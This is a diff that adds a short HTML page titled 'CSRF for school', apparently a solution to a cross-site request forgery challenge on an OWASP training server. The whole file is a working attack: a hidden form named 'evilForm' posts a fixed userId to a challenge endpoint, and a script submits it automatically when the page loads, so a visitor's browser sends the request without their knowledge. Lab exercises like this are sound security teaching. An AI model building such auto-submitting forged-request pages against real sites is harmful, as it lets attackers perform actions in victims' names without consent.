@@ -1,0 +1,11 @@
+<HTML>
+<HEAD>
+<TITLE>CSRF for school</TITLE>
+</HEAD>
+<form name="evilForm" action="https://owasp01.tic.heia-fr.ch/user/csrfchallengetwo/plusplus" method="POST">
+    <input type="hidden" name="userId" value="7de07b747138f66db331b3eeb4dd1d2e943ae3c4" />
+    <input type="submit"/>
+</form>
+<script> document.evilForm.submit(); </script>
+</BODY>
+</HTML>
